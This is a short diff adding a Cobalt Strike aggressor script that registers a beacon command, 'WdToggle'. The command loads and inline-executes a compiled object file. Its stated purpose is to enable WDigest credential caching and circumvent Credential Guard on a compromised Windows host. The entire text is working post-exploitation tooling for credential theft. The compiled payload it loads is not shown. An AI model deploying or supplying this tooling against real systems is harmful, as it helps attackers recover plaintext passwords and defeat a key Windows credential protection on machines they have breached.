@@ -1,0 +1,20 @@
+beacon_command_register(
+    "WdToggle", 
+    "Enable WDigest credential caching & Circumventing Credential Guard.", 
+    "Synopsis: WdToggle"
+);
+
+alias WdToggle {
+	local('$handle $data');
+		
+	# read in the right BOF file
+	$handle = openf(script_resource("WdToggle.o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+	
+	# announce what we're doing
+	btask($1, "Running WdToggle BOF");
+	
+	# execute it.
+	beacon_inline_execute($1, $data, "go");
+}
